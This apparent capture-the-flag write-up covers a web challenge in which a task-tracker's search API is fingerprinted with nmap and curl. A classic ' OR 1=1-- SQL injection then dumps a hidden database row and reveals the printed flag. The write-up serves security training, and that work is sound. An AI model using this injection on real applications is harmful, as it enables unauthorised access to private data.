<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>


## Homemade task system 3

**Category:** Web  
**Author:** Mārtiņš #1337  
**Flag:** `MCTF{SQL_1nj3cti0ns_4r3_0v3rd0n3}`  

> _“No more storing static pages on the web server, Mārtiņš will make a database and store the info there. There's no way the attacker will access the db that isn't user facing, right?”_

---

### 1. Recon

Target IP: `10.240.3.144`

Basic service discovery:

```bash
nmap -sC -sV 10.240.3.144
```

Relevant output:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Caddy httpd
|_http-title: Mārtiņš’ Task Tracker (DB content)
|_http-server-header: Caddy
```

So we have a single HTTP service on port 80, fronted by **Caddy**, serving a web app called:

> **“Mārtiņš’ Task Tracker (DB content)”**

This already hints that the app is **DB-backed** and probably exposes some DB-driven API.

---

### 2. Web app analysis

Grabbed the main page:

```bash
curl -s http://10.240.3.144/ -o index.html
```

Key parts (simplified):

```html
<p>Browse tasks loaded from the database. Use the search box to filter by name:</p>

<label for="search">Search tasks:</label>
<input id="search" type="search" placeholder="Search tasks..." />
<ul id="list"></ul>

<div class="status-bar">
  <p class="status-bar-field">Source: /api/pages</p>
  <p class="status-bar-field">Mode: Instant search</p>
</div>
```

And the JavaScript:

```html
<script>
async function render(data){
  const list = document.getElementById('list');
  list.innerHTML = data.map(
    d => `<li><a href="/page.html?u=${encodeURIComponent(d.url)}">${d.name}</a></li>`
  ).join('');
}

async function loadAll(){
  const res = await fetch('/api/pages');
  render(await res.json());
}

document.getElementById('search').addEventListener('input', async e => {
  const q = e.target.value.trim();
  const res = await fetch(
    q ? '/api/search?query=' + encodeURIComponent(q) : '/api/pages'
  );
  render(await res.json());
});

loadAll();
</script>
```

So we learn:

- **All tasks** are fetched from: `GET /api/pages`
- **Search** uses: `GET /api/search?query=...`
- Links to individual tasks go to: `/page.html?u=<url-from-API>`

---

### 3. Enumerating API endpoints

#### 3.1 `/api/pages`

```bash
curl -s http://10.240.3.144/api/pages
```

Output:

```json
[
  {
    "name":"1. Analyze your mistakes",
    "url":"b35bfdef011550d5c39b84da8da779a6cae6ea49d5919625a5bd19d0b0bb06ece1417d4c49bf4207133aa02619e9052ca891e35e810087790a66c748a46d5440"
  },
  {
    "name":"2. Ask yourself tough questions",
    "url":"34bdbe30c90d189efa1fc732c1417c206e1ba916b39c7dfdc92e2376802d3a59cf330f0b30f14c71818d554757e139472bd12fde1acbbf24375e621a5ff029b1"
  },
  {
    "name":"3. Reframe The Error",
    "url":"7ca95df8e8b2de4eb29679ef033d4b8837edb23dc632b89d7d07e4018ca1e79f5c664a2969bc34c916764d6916bbbec749f40f295d7a61d774f6a410130b0bbe"
  },
  {
    "name":"4. Put Lessons Learned into practice",
    "url":"634b1f66cca621f7433f1837b195684d770f11cd4fab0188adac2b2222ae13a0dd55ad0730067332b8f562af5066bb4042427f367f485e477857432100821cd4"
  }
]
```

We see 4 tasks, each with a long hex-encoded `url` field that acts as an ID.

#### 3.2 `/page.html`

Fetching one of the task pages:

```bash
curl -s "http://10.240.3.144/page.html?u=b35bfdef011550d5c39b84da8da779a6cae6ea49d5919625a5bd19d0b0bb06ece1417d4c49bf4207133aa02619e9052ca891e35e810087790a66c748a46d5440" -o page1.html
```

Important snippet:

```html
<script>
function getParam(name){
  const u = new URL(location.href);
  return u.searchParams.get(name);
}
const id = getParam('u');
fetch('/api/page/' + encodeURIComponent(id))
  .then(r => r.json())
  .then(data => {
    // renders page content from API
  });
</script>
```

So:

- `/page.html` is just a viewer.
- The **actual data** is at `GET /api/page/<id>`.

#### 3.3 `/api/page/<id>`

Test with a valid ID:

```bash
curl -s "http://10.240.3.144/api/page/b35bfdef011550d5c39b84da8da779a6cae6ea49d5919625a5bd19d0b0bb06ece1417d4c49bf4207133aa02619e9052ca891e35e810087790a66c748a46d5440"
```

Response:

```json
{
  "content": "Reflect on what went wrong and why...",
  "name": "1. Analyze your mistakes"
}
```

And with an invalid ID:

```bash
curl -v "http://10.240.3.144/api/page/aaaaaaaa"
```

Response (truncated):

```text
HTTP/1.1 500 Internal Server Error
Server: Caddy
Server: Werkzeug/3.1.3 Python/3.11.14

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error ...</p>
```

So the backend is a **Python/Werkzeug** app, and `/api/page/<id>` expects the hex blob to be valid; random junk causes a 500.

---

### 4. Probing the search endpoint

Normal search:

```bash
curl -s "http://10.240.3.144/api/search?query=Analyze"
```

Response:

```json
[
  {
    "name":"1. Analyze your mistakes",
    "url":"b35bfdef011550d5c39b84da8da779a6cae6ea49d5919625a5bd19d0b0bb06ece1417d4c49bf4207133aa02619e9052ca891e35e810087790a66c748a46d5440"
  }
]
```

Now try breaking it with a bare quote:

```bash
curl -v "http://10.240.3.144/api/search?query='" -o search_err.html
```

Response is a `500 Internal Server Error` HTML page, same as for the bogus `/api/page/aaaaaaaa`.

This strongly suggests:

- The **`query` parameter is interpolated directly into an SQL statement**, without proper parameterization.
- A mismatched `'` breaks the query and yields a 500.

---

### 5. Exploiting SQL injection in `/api/search`

We suspect something like:

```sql
SELECT name, url FROM pages
WHERE name LIKE '%' || :query || '%';
```

but implemented unsafely as string concatenation.

We use a classic OR 1=1 injection via URL-encoding:

```bash
curl -s "http://10.240.3.144/api/search?query=%27%20OR%201%3D1--%20"
```

This decodes to:

```sql
' OR 1=1-- 
```

If the original query is:

```sql
... WHERE name LIKE '%<query>%'
```

it becomes:

```sql
WHERE name LIKE '%' OR 1=1-- '%'
```

- `LIKE '%'` is always true,
- `OR 1=1` makes the whole condition true,
- `--` comments out the trailing `'%` bit.

Result: **all rows** from the `pages` table are returned, including non-public ones.

The response:

```json
[
  {
    "name":"1. Analyze your mistakes",
    "url":"b35bfdef011550d5c39b84da8da779a6cae6ea49d5919625a5bd19d0b0bb06ece1417d4c49bf4207133aa02619e9052ca891e35e810087790a66c748a46d5440"
  },
  {
    "name":"2. Ask yourself tough questions",
    "url":"34bdbe30c90d189efa1fc732c1417c206e1ba916b39c7dfdc92e2376802d3a59cf330f0b30f14c71818d554757e139472bd12fde1acbbf24375e621a5ff029b1"
  },
  {
    "name":"3. Reframe The Error",
    "url":"7ca95df8e8b2de4eb29679ef033d4b8837edb23dc632b89d7d07e4018ca1e79f5c664a2969bc34c916764d6916bbbec749f40f295d7a61d774f6a410130b0bbe"
  },
  {
    "name":"4. Put Lessons Learned into practice",
    "url":"634b1f66cca621f7433f1837b195684d770f11cd4fab0188adac2b2222ae13a0dd55ad0730067332b8f562af5066bb4042427f367f485e477857432100821cd4"
  },
  {
    "name":"5. Request Feedback",
    "url":"0107c84c63d75e3a308b318e0760d6deb162ff85c5099961d0a3bfd36d4fe5d1aef8b9f07540f679eb9a17c81ac1922c88ec721d104221032ea2a5b8d6174941"
  }
]
```

The **fifth entry** (`5. Request Feedback`) is new and **was not shown** by `/api/pages`.  
That’s clearly the hidden “DB-only” page the challenge description was talking about.

---

### 6. Retrieving the flag

Using the hidden task’s `url` value:

```bash
curl -s "http://10.240.3.144/api/page/0107c84c63d75e3a308b318e0760d6deb162ff85c5099961d0a3bfd36d4fe5d1aef8b9f07540f679eb9a17c81ac1922c88ec721d104221032ea2a5b8d6174941"
```

Inside the JSON content was the flag:

```text
MCTF{SQL_1nj3cti0ns_4r3_0v3rd0n3}
```
